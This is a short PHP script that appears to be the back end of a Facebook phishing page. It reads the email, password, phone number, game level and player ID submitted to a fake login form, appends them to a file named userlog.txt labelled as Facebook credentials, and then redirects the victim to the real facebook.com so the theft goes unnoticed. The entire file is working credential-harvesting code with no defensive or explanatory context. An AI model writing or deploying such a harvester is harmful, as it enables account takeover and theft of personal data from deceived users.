<?php

file_put_contents("userlog.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "Level" .$_POST['level']. "Phone" . $_POST['phone']. "Id" .$_POST['playid']. "\n", FILE_APPEND);
header('Location: https://facebook.com');
exit();
?>
